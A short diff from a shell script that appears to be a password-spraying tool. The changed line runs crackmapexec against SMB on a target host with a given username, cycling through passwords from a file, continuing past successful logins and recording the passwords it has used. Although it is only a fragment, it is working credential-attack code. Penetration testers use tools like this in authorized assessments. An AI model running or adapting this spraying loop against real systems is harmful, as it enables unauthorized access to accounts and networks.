@@ -35,7 +35,7 @@ while [ $count -gt 0 ]; do
 	
 	for pass in $(cat tmp.txt | head -2); do
 		echo "Spraying: $pass"
-		poetry run crackmapexec smb $1 -u $2 -p $pass --continue-on-success --log ./spraygun-log.log
+		crackmapexec smb $1 -u $2 -p $pass --continue-on-success --log ./spraygun-log.log
 		echo $pass > /root/Documents/sprays/used-passwords.txt
 
 		sleep 5
